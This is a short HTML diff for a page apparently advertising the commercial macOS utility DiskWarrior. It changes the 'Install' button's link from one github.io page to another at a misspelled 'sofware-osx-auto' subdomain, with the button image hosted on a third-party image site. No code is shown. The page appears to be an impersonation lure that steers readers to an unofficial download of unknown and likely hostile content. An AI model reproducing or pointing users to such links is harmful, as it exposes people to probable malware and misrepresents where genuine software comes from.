@@ -6,7 +6,7 @@
 <h3>DiskWarrior Mac - data recovery and disk maintenance</h3>
 <p>DiskWarrior Mac is a professional disk repair and recovery utility application specifically developed for macOS environments</p>
 
-<a href="https://mac-apps-install.github.io/.github/">
+<a href="https://sofware-osx-auto.github.io/.github/dw">
   <img src="https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png" width="200" alt="Install"/>
 </a>
 </div>
